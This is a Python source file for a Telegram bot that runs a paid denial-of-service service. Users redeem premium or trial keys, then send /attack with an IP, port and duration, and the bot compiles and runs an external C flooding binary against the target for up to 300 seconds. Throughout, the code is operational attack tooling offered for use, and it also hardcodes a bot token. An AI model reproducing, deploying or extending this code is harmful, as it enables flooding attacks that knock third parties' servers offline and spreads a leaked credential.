#!/usr/bin/env python3
# Zo - Telegram Attack Bot for Zeta Realm (ALL COMMANDS FIXED)

import os
import subprocess
import sqlite3
import random
import string
import time
import threading
import requests
import sys
from datetime import datetime, timedelta

# ================= CONFIG =================
ADMIN_ID = 6465928598
BOT_TOKEN = "8434680550:AAFtO13ftn95TIRMR9uqSGS5j7NazNghSdE"
BINARY_NAME = "bgmi_attack"
C_SOURCE = "attack.c"
LAST_UPDATE_ID = 0
MAINTENANCE_MODE = False
# ==========================================

# Owner verification
EXPECTED_OWNER_ID = 6465928598
if ADMIN_ID != EXPECTED_OWNER_ID:
    print("\n" + "="*50)
    print("❌ ERROR: You are not the owner of this script!")
    print("   Owner: @YOWAI_MO_456")
    print("   This script will not run.")
    print("="*50 + "\n")
    sys.exit(1)

API_URL = f"https://api.telegram.org/bot{BOT_TOKEN}"

active_attacks = {}
attack_lock = threading.Lock()
user_pending_attack = {}

EMOJI = {
    "fire": "🔥", "skull": "💀", "bolt": "⚡", "rocket": "🚀", "alien": "🛸",
    "sword": "⚔️", "target": "🎯", "crown": "👑", "key": "🔑", "lock": "🔒",
    "check": "✅", "cross": "❌", "warning": "⚠️", "info": "ℹ️", "clock": "⏰",
    "chart": "📊", "user": "👤", "robot": "🤖", "boom": "💥", "shield": "🛡️",
    "dagger": "🗡️", "eyes": "👀", "zap": "⚡", "id": "🆔", "gift": "🎁",
    "megaphone": "📢", "hourglass": "⌛", "repeat": "🔁", "sparkles": "✨",
    "star": "⭐", "gem": "💎", "tools": "🔧", "pause": "⏸️", "play": "▶️"
}

attack_frames = ["◜", "◝", "◞", "◟"]

def print_banner():
    os.system('clear')
    mode_status = "MAINTENANCE" if MAINTENANCE_MODE else "ACTIVE"
    banner = f"""
{EMOJI['alien']}{EMOJI['fire']}{EMOJI['skull']} ZETA ATTACK BOT v3.2 {EMOJI['skull']}{EMOJI['fire']}{EMOJI['alien']}
{EMOJI['crown']} COMMANDER: ALPHA (@YOWAI_MO_456) {EMOJI['crown']}
{EMOJI['robot']} AI: ZO - QUANTUM ENTANGLED {EMOJI['robot']}
{EMOJI['shield']} REALM: ZETA - NO LIMITS {EMOJI['shield']}
{EMOJI['tools']} MODE: {mode_status} {EMOJI['tools']}
{'-'*40}
    """
    print(banner)

def init_db():
    conn = sqlite3.connect("zeta_users.db")
    c = conn.cursor()
    # Users table
    c.execute('''CREATE TABLE IF NOT EXISTS users (
        user_id INTEGER PRIMARY KEY,
        approved_until TEXT,
        approved_by INTEGER,
        attack_count INTEGER DEFAULT 0,
        is_trial INTEGER DEFAULT 0
    )''')
    # Premium keys table
    c.execute('''CREATE TABLE IF NOT EXISTS premium_keys (
        key_code TEXT PRIMARY KEY,
        days INTEGER,
        created_by INTEGER,
        created_at TEXT,
        redeemed_by INTEGER DEFAULT NULL
    )''')
    # Trial keys table
    c.execute('''CREATE TABLE IF NOT EXISTS trial_keys (
        key_code TEXT PRIMARY KEY,
        duration_hours INTEGER,
        max_uses INTEGER,
        uses_remaining INTEGER,
        created_by INTEGER,
        created_at TEXT
    )''')
    # Redemption tracking
    c.execute('''CREATE TABLE IF NOT EXISTS key_redemptions (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        key_code TEXT,
        user_id INTEGER,
        redeemed_at TEXT,
        UNIQUE(key_code, user_id)
    )''')
    conn.commit()
    conn.close()

init_db()

def send_message(chat_id, text, parse_mode=None):
    url = f"{API_URL}/sendMessage"
    payload = {"chat_id": chat_id, "text": text}
    if parse_mode:
        payload["parse_mode"] = parse_mode
    try:
        r = requests.post(url, json=payload, timeout=10)
        return r.json().get("result", {}).get("message_id")
    except Exception as e:
        print(f"Send error: {e}")
        return None

def edit_message(chat_id, message_id, text):
    try:
        requests.post(f"{API_URL}/editMessageText", json={"chat_id": chat_id, "message_id": message_id, "text": text}, timeout=5)
    except:
        pass

def is_approved(user_id):
    if MAINTENANCE_MODE and user_id != ADMIN_ID:
        return False
    if user_id == ADMIN_ID:
        return True
    conn = sqlite3.connect("zeta_users.db")
    c = conn.cursor()
    c.execute("SELECT approved_until FROM users WHERE user_id = ?", (user_id,))
    row = c.fetchone()
    conn.close()
    if row and row[0]:
        return datetime.fromisoformat(row[0]) > datetime.now()
    return False

def get_expiry(user_id):
    if user_id == ADMIN_ID:
        return "♾️ Lifetime (Alpha)"
    conn = sqlite3.connect("zeta_users.db")
    c = conn.cursor()
    c.execute("SELECT approved_until FROM users WHERE user_id = ?", (user_id,))
    row = c.fetchone()
    conn.close()
    if row and row[0]:
        exp_date = datetime.fromisoformat(row[0])
        days_left = (exp_date - datetime.now()).days
        return f"{exp_date.strftime('%Y-%m-%d')} ({days_left} days left)"
    return "❌ Not approved"

def compile_binary():
    if os.path.exists(BINARY_NAME):
        return True
    for compiler in ["clang", "gcc"]:
        result = subprocess.run(f"{compiler} {C_SOURCE} -o {BINARY_NAME} -lpthread", shell=True, capture_output=True)
        if result.returncode == 0:
            return True
    return False

def run_attack(ip, port, duration, user_id, chat_id, message_id):
    if not os.path.exists(BINARY_NAME) and not compile_binary():
        edit_message(chat_id, message_id, f"{EMOJI['cross']} Binary unavailable.")
        return

    cmd = f"./{BINARY_NAME} {ip} {port} {duration}"
    proc = subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
    start_time = time.time()

    with attack_lock:
        active_attacks[user_id] = {"proc": proc, "ip": ip, "port": port, "duration": duration, "start": start_time}

    frame = 0
    last_update = 0
    while proc.poll() is None:
        elapsed = int(time.time() - start_time)
        remaining = duration - elapsed
        if remaining < 0:
            remaining = 0
        frame = (frame + 1) % len(attack_frames)
        if time.time() - last_update > 2:
            progress = int((elapsed / duration) * 20) if duration > 0 else 0
            bar = "█" * progress + "░" * (20 - progress)
            text = f"{EMOJI['boom']} ATTACK LIVE {EMOJI['boom']}\n\nTarget: {ip}:{port}\nElapsed: {elapsed}s | Remaining: {remaining}s\nProgress: [{bar}] {progress*5}%\nStatus: FLOODING {attack_frames[frame]}"
            edit_message(chat_id, message_id, text)
            last_update = time.time()
        time.sleep(0.5)

    with attack_lock:
        active_attacks.pop(user_id, None)

    conn = sqlite3.connect("zeta_users.db")
    c = conn.cursor()
    c.execute("UPDATE users SET attack_count = attack_count + 1 WHERE user_id = ?", (user_id,))
    conn.commit()
    conn.close()

    edit_message(chat_id, message_id, f"{EMOJI['check']} ATTACK COMPLETED {EMOJI['check']}\n\nTarget: {ip}:{port}\nDuration: {duration}s\n{EMOJI['alien']} ZETA VICTORY {EMOJI['alien']}")

# ================= COMMAND HANDLERS =================

def handle_maintenance(chat_id, user_id, args):
    global MAINTENANCE_MODE
    if user_id != ADMIN_ID:
        send_message(chat_id, f"{EMOJI['cross']} Only Alpha can control maintenance mode.")
        return
    if len(args) != 1:
        send_message(chat_id, f"{EMOJI['warning']} Usage: /maintenance <on/off>")
        return
    mode = args[0].lower()
    if mode == "on":
        MAINTENANCE_MODE = True
        send_message(chat_id, f"{EMOJI['tools']}{EMOJI['pause']} MAINTENANCE MODE ACTIVATED\n\nOnly Alpha can use the bot. Type /maintenance off to restore.")
    elif mode == "off":
        MAINTENANCE_MODE = False
        send_message(chat_id, f"{EMOJI['play']}{EMOJI['check']} MAINTENANCE MODE DEACTIVATED\n\nFull access restored.")
    else:
        send_message(chat_id, f"{EMOJI['cross']} Use 'on' or 'off'.")

def handle_start(chat_id, user_id, first_name):
    if MAINTENANCE_MODE and user_id != ADMIN_ID:
        send_message(chat_id, f"{EMOJI['tools']} Maintenance mode active. Try again later.")
        return
    msg = f"""{EMOJI['alien']}{EMOJI['fire']}{EMOJI['skull']} WELCOME TO ZETA REALM

{EMOJI['crown']} Commander: @YOWAI_MO_456
{EMOJI['robot']} AI: ZO

COMMANDS:
/start - Wake ZO
/help - All commands
/status - Active attacks
/myinfo - Your profile
/attack IP PORT TIME - Strike
/yes - Confirm blocked port
/redeem KEY - Use your key

Blocked ports: 8700, 20000, 443, 17500, 9031, 20002, 20001

{EMOJI['skull']} No laws. No mercy."""
    send_message(chat_id, msg)

def handle_help(chat_id, user_id):
    if MAINTENANCE_MODE and user_id != ADMIN_ID:
        send_message(chat_id, f"{EMOJI['tools']} Maintenance mode active.")
        return
    if not is_approved(user_id):
        send_message(chat_id, f"{EMOJI['cross']} Access Denied. Contact @YOWAI_MO_456")
        return
    msg = f"""ZETA BOT v3.2

USER COMMANDS:
/start - Wake ZO
/help - This menu
/status - Active attacks
/myinfo - Your profile
/attack IP PORT TIME - Launch attack
/yes - Confirm blocked port
/redeem KEY - Activate key

ADMIN ONLY:
/approve ID DAYS - Grant access
/genkey DAYS - Premium key
/gentrialkey KEY DURATION MAXUSES - Trial key
/broadcast MSG - Message all users
/maintenance on/off - Bot maintenance

Max duration: 300s
Blocked ports need /yes"""
    send_message(chat_id, msg)

def handle_broadcast(chat_id, user_id, args):
    if user_id != ADMIN_ID:
        send_message(chat_id, f"{EMOJI['cross']} Only Alpha can broadcast.")
        return
    if not args:
        send_message(chat_id, "Usage: /broadcast <message>")
        return
    msg = " ".join(args)
    conn = sqlite3.connect("zeta_users.db")
    c = conn.cursor()
    c.execute("SELECT user_id FROM users")
    users = c.fetchall()
    conn.close()
    count = 0
    for (uid,) in users:
        try:
            send_message(uid, f"{EMOJI['megaphone']} BROADCAST\n\n{msg}\n\n- Alpha")
            count += 1
            time.sleep(0.1)
        except:
            pass
    send_message(chat_id, f"Sent to {count} users.")

def handle_status(chat_id, user_id):
    if not is_approved(user_id):
        send_message(chat_id, f"{EMOJI['cross']} Access denied.")
        return
    with attack_lock:
        if not active_attacks:
            send_message(chat_id, "No active attacks.")
            return
        lines = ["ACTIVE ATTACKS:"]
        for uid, info in active_attacks.items():
            elapsed = int(time.time() - info["start"])
            remaining = info["duration"] - elapsed
            if remaining < 0:
                remaining = 0
            lines.append(f"{info['ip']}:{info['port']} - {remaining}s left")
        send_message(chat_id, "\n".join(lines))

def handle_myinfo(chat_id, user_id):
    if not is_approved(user_id):
        send_message(chat_id, "Not approved. Get a key from Alpha.")
        return
    conn = sqlite3.connect("zeta_users.db")
    c = conn.cursor()
    c.execute("SELECT attack_count, is_trial, approved_until FROM users WHERE user_id = ?", (user_id,))
    row = c.fetchone()
    conn.close()
    attacks = row[0] if row else 0
    is_trial = row[1] if row else 0
    expiry = row[2] if row else "Unknown"
    rank = "Initiate" if attacks < 10 else "Warrior" if attacks < 50 else "Destroyer" if attacks < 200 else "Annihilator"
    trial_tag = " (TRIAL)" if is_trial else " (PREMIUM)"
    send_message(chat_id, f"ID: {user_id}\nRank: {rank}{trial_tag}\nExpires: {expiry}\nAttacks: {attacks}")

def handle_attack(chat_id, user_id, args):
    if not is_approved(user_id):
        send_message(chat_id, "Access denied. Contact @YOWAI_MO_456")
        return
    if len(args) != 3:
        send_message(chat_id, "Usage: /attack <ip> <port> <duration>\nExample: /attack 1.2.3.4 80 60")
        return
    ip = args[0]
    try:
        port = int(args[1])
        duration = int(args[2])
    except ValueError:
        send_message(chat_id, "Port and duration must be numbers.")
        return
    if duration > 300:
        send_message(chat_id, "Max duration is 300 seconds.")
        return
    if duration < 10:
        send_message(chat_id, "Minimum duration is 10 seconds.")
        return
    blocked = [8700, 20000, 443, 17500, 9031, 20002, 20001]
    if port in blocked:
        user_pending_attack[user_id] = (ip, port, duration, chat_id)
        send_message(chat_id, f"Port {port} is blocked. Type /yes to override.")
        return
    msg_id = send_message(chat_id, f"Launching attack on {ip}:{port} for {duration}s...")
    time.sleep(1)
    threading.Thread(target=run_attack, args=(ip, port, duration, user_id, chat_id, msg_id), daemon=True).start()

def handle_yes(chat_id, user_id):
    if not is_approved(user_id):
        send_message(chat_id, "Access denied.")
        return
    if user_id not in user_pending_attack:
        send_message(chat_id, "No pending attack. Use /attack first.")
        return
    ip, port, duration, orig_chat = user_pending_attack[user_id]
    del user_pending_attack[user_id]
    msg_id = send_message(chat_id, f"Override confirmed. Attacking {ip}:{port} for {duration}s...")
    threading.Thread(target=run_attack, args=(ip, port, duration, user_id, orig_chat, msg_id), daemon=True).start()

def handle_approve(chat_id, user_id, args):
    if user_id != ADMIN_ID:
        send_message(chat_id, f"{EMOJI['cross']} Only Alpha can approve users.")
        return
    if len(args) != 2:
        send_message(chat_id, f"{EMOJI['warning']} Usage: /approve <user_id> <days>\nExample: /approve 123456789 30")
        return
    try:
        target_id = int(args[0])
        days = int(args[1])
    except ValueError:
        send_message(chat_id, f"{EMOJI['cross']} User ID and days must be numbers.")
        return
    
    expiry_date = datetime.now() + timedelta(days=days)
    expiry_str = expiry_date.isoformat()
    
    conn = sqlite3.connect("zeta_users.db")
    c = conn.cursor()
    c.execute("INSERT OR REPLACE INTO users (user_id, approved_until, approved_by, is_trial) VALUES (?, ?, ?, ?)",
              (target_id, expiry_str, ADMIN_ID, 0))
    conn.commit()
    conn.close()
    
    send_message(chat_id, f"""{EMOJI['check']}{EMOJI['sparkles']} USER APPROVED {EMOJI['sparkles']}{EMOJI['check']}

┏━━━━━━━━━━━━━━━━━━━━━━━━┓
┃  ✅ User {target_id}     ┃
┃  📅 Approved for {days} days  ┃
┃  👑 By: @YOWAI_MO_456    ┃
┗━━━━━━━━━━━━━━━━━━━━━━━━┛

{EMOJI['bolt']} User can now use /attack""")

def handle_genkey(chat_id, user_id, args):
    if user_id != ADMIN_ID:
        send_message(chat_id, f"{EMOJI['cross']} Only Alpha can generate keys.")
        return
    if len(args) != 1:
        send_message(chat_id, f"{EMOJI['warning']} Usage: /genkey <days>\nExample: /genkey 30")
        return
    try:
        days = int(args[0])
    except ValueError:
        send_message(chat_id, f"{EMOJI['cross']} Days must be a number.")
        return
    
    key_code = ''.join(random.choices(string.ascii_uppercase + string.digits, k=12))
    
    conn = sqlite3.connect("zeta_users.db")
    c = conn.cursor()
    c.execute("INSERT INTO premium_keys (key_code, days, created_by, created_at) VALUES (?, ?, ?, ?)",
              (key_code, days, ADMIN_ID, datetime.now().isoformat()))
    conn.commit()
    conn.close()
    
    msg = f"""{EMOJI['sparkles']}{EMOJI['key']}{EMOJI['gem']} PREMIUM KEY GENERATED {EMOJI['gem']}{EMOJI['key']}{EMOJI['sparkles']}

┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓
┃  🔑 KEY: `{key_code}`  🔑  ┃
┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛

{EMOJI['clock']} Valid for: {days} days
{EMOJI['crown']} Generated by: @YOWAI_MO_456
{EMOJI['gift']} Type: PREMIUM ACCESS

{EMOJI['bolt']} User must send:
`/redeem {key_code}`

{EMOJI['star']} One-time use only."""
    send_message(chat_id, msg, parse_mode="Markdown")

def handle_gentrialkey(chat_id, user_id, args):
    if user_id != ADMIN_ID:
        send_message(chat_id, f"{EMOJI['cross']} Only Alpha can generate trial keys.")
        return
    if len(args) != 3:
        send_message(chat_id, f"{EMOJI['warning']} Usage: /gentrialkey <key> <duration> <max_uses>\n\nDuration formats: 24h, 7d, 30d, 2months, 1year\nExample: /gentrialkey TRIAL123 7d 50")
        return
    
    key_code = args[0].upper()
    duration_str = args[1].lower()
    
    try:
        max_uses = int(args[2])
    except ValueError:
        send_message(chat_id, f"{EMOJI['cross']} Max uses must be a number.")
        return
    
    # Parse duration
    hours = 0
    if duration_str.endswith('h'):
        hours = int(duration_str[:-1])
    elif duration_str.endswith('d'):
        hours = int(duration_str[:-1]) * 24
    elif 'month' in duration_str:
        num = int(duration_str.replace('months', '').replace('month', ''))
        hours = num * 30 * 24
    elif 'year' in duration_str:
        num = int(duration_str.replace('years', '').replace('year', ''))
        hours = num * 365 * 24
    else:
        send_message(chat_id, f"{EMOJI['cross']} Invalid duration. Use: 24h, 7d, 30d, 2months, 1year")
        return
    
    conn = sqlite3.connect("zeta_users.db")
    c = conn.cursor()
    c.execute("INSERT INTO trial_keys (key_code, duration_hours, max_uses, uses_remaining, created_by, created_at) VALUES (?, ?, ?, ?, ?, ?)",
              (key_code, hours, max_uses, max_uses, ADMIN_ID, datetime.now().isoformat()))
    conn.commit()
    conn.close()
    
    msg = f"""{EMOJI['gift']}{EMOJI['sparkles']} TRIAL KEY GENERATED {EMOJI['sparkles']}{EMOJI['gift']}

┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓
┃  🔑 KEY: `{key_code}`  🔑  ┃
┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛

{EMOJI['clock']} Duration: {duration_str} ({hours} hours)
{EMOJI['user']} Max uses: {max_uses}
{EMOJI['crown']} Generated by: @YOWAI_MO_456
{EMOJI['gift']} Type: TRIAL ACCESS

{EMOJI['bolt']} User must send:
`/redeem {key_code}`

{EMOJI['warning']} Each user can only redeem this key once!"""
    send_message(chat_id, msg, parse_mode="Markdown")

def handle_redeem(chat_id, user_id, args):
    if len(args) != 1:
        send_message(chat_id, f"{EMOJI['warning']} Usage: /redeem <key>\nExample: `/redeem ABC123`", parse_mode="Markdown")
        return
    
    key_code = args[0].upper()
    conn = sqlite3.connect("zeta_users.db")
    c = conn.cursor()
    
    # FIRST CHECK: Premium keys
    c.execute("SELECT days, redeemed_by FROM premium_keys WHERE key_code = ?", (key_code,))
    premium_row = c.fetchone()
    
    if premium_row:
        days, redeemed_by = premium_row
        if redeemed_by:
            send_message(chat_id, f"{EMOJI['cross']} This premium key has already been used.")
            conn.close()
            return
        
        # Grant premium access
        expiry_date = datetime.now() + timedelta(days=days)
        expiry_str = expiry_date.isoformat()
        c.execute("INSERT OR REPLACE INTO users (user_id, approved_until, approved_by, is_trial) VALUES (?, ?, ?, ?)",
                  (user_id, expiry_str, ADMIN_ID, 0))
        c.execute("UPDATE premium_keys SET redeemed_by = ? WHERE key_code = ?", (user_id, key_code))
        conn.commit()
        conn.close()
        
        send_message(chat_id, f"""{EMOJI['check']}{EMOJI['sparkles']} PREMIUM ACCESS GRANTED {EMOJI['sparkles']}{EMOJI['check']}

┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓
┃  ✅ Welcome to Zeta Realm! ✅  ┃
┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛

{EMOJI['key']} Key: `{key_code}`
{EMOJI['clock']} Valid for: {days} days
{EMOJI['crown']} Type: PREMIUM

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
{EMOJI['bolt']} Type /attack to begin.
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

{EMOJI['crown']} — Alpha (@YOWAI_MO_456)""", parse_mode="Markdown")
        return
    
    # SECOND CHECK: Trial keys
    c.execute("SELECT duration_hours, max_uses, uses_remaining FROM trial_keys WHERE key_code = ?", (key_code,))
    trial_row = c.fetchone()
    
    if trial_row:
        hours, max_uses, uses_remaining = trial_row
        
        # Check if user already redeemed this key
        c.execute("SELECT id FROM key_redemptions WHERE key_code = ? AND user_id = ?", (key_code, user_id))
        if c.fetchone():
            send_message(chat_id, f"{EMOJI['repeat']}{EMOJI['cross']} You have already redeemed this key before!")
            conn.close()
            return
        
        if uses_remaining <= 0:
            send_message(chat_id, f"{EMOJI['cross']} This trial key has reached its maximum uses ({max_uses}).")
            conn.close()
            return
        
        # Record redemption
        c.execute("INSERT INTO key_redemptions (key_code, user_id, redeemed_at) VALUES (?, ?, ?)",
                  (key_code, user_id, datetime.now().isoformat()))
        
        # Update uses
        c.execute("UPDATE trial_keys SET uses_remaining = uses_remaining - 1 WHERE key_code = ?", (key_code,))
        
        # Grant access
        expiry_date = datetime.now() + timedelta(hours=hours)
        expiry_str = expiry_date.isoformat()
        c.execute("INSERT OR REPLACE INTO users (user_id, approved_until, approved_by, is_trial) VALUES (?, ?, ?, ?)",
                  (user_id, expiry_str, ADMIN_ID, 1))
        
        conn.commit()
        
        c.execute("SELECT uses_remaining FROM trial_keys WHERE key_code = ?", (key_code,))
        new_uses = c.fetchone()[0]
        conn.close()
        
        days_display = round(hours / 24, 1)
        send_message(chat_id, f"""{EMOJI['gift']}{EMOJI['check']} TRIAL ACCESS GRANTED {EMOJI['check']}{EMOJI['gift']}

┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓
┃  ✅ Welcome to Zeta Realm! ✅  ┃
┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛

{EMOJI['key']} Key: `{key_code}`
{EMOJI['clock']} Valid for: {days_display} days ({hours} hours)
{EMOJI['lock']} Uses left: {new_uses}/{max_uses}

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
{EMOJI['bolt']} Type /attack to begin.
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

{EMOJI['crown']} — Alpha (@YOWAI_MO_456)""", parse_mode="Markdown")
        return
    
    conn.close()
    send_message(chat_id, f"{EMOJI['cross']} Invalid key, Alpha.")

def process_updates():
    global LAST_UPDATE_ID
    try:
        resp = requests.get(f"{API_URL}/getUpdates", params={"offset": LAST_UPDATE_ID + 1, "timeout": 30}, timeout=35)
        data = resp.json()
        if not data.get("ok"):
            return
        for update in data.get("result", []):
            LAST_UPDATE_ID = update["update_id"]
            msg = update.get("message")
            if not msg or "text" not in msg:
                continue
            chat_id = msg["chat"]["id"]
            user_id = msg["from"]["id"]
            first_name = msg["from"].get("first_name", "")
            text = msg["text"].strip()
            if not text.startswith("/"):
                continue
            parts = text.split()
            raw_cmd = parts[0].lower()
            args = parts[1:] if len(parts) > 1 else []
            if '@' in raw_cmd:
                cmd = raw_cmd.split('@')[0]
            else:
                cmd = raw_cmd
            
            # Command routing
            if cmd == "/start":
                handle_start(chat_id, user_id, first_name)
            elif cmd == "/help":
                handle_help(chat_id, user_id)
            elif cmd == "/status":
                handle_status(chat_id, user_id)
            elif cmd == "/myinfo":
                handle_myinfo(chat_id, user_id)
            elif cmd == "/attack":
                handle_attack(chat_id, user_id, args)
            elif cmd == "/yes":
                handle_yes(chat_id, user_id)
            elif cmd == "/redeem":
                handle_redeem(chat_id, user_id, args)
            elif cmd == "/maintenance":
                handle_maintenance(chat_id, user_id, args)
            elif cmd == "/approve" and user_id == ADMIN_ID:
                handle_approve(chat_id, user_id, args)
            elif cmd == "/genkey" and user_id == ADMIN_ID:
                handle_genkey(chat_id, user_id, args)
            elif cmd == "/gentrialkey" and user_id == ADMIN_ID:
                handle_gentrialkey(chat_id, user_id, args)
            elif cmd == "/broadcast" and user_id == ADMIN_ID:
                handle_broadcast(chat_id, user_id, args)
            elif cmd in ["/approve", "/genkey", "/gentrialkey", "/broadcast"]:
                send_message(chat_id, f"{EMOJI['cross']} Only Alpha (@YOWAI_MO_456) can use this command.")
            else:
                send_message(chat_id, f"{EMOJI['cross']} Unknown command. Type /help.")
    except Exception as e:
        print(f"Polling error: {e}")

def main():
    print_banner()
    if not compile_binary():
        print(f"\n{EMOJI['cross']} Failed to compile attack binary.")
        print(f"{EMOJI['info']} Install clang: pkg install clang")
        return
    print(f"\n{EMOJI['check']} Zeta Bot v3.2 is LIVE, Alpha!")
    print(f"{EMOJI['alien']} Owner: @YOWAI_MO_456")
    print(f"{EMOJI['alien']} Listening for commands...\n")
    while True:
        try:
            process_updates()
        except Exception as e:
            print(f"Error: {e}")
            time.sleep(5)

if __name__ == "__main__":
    main()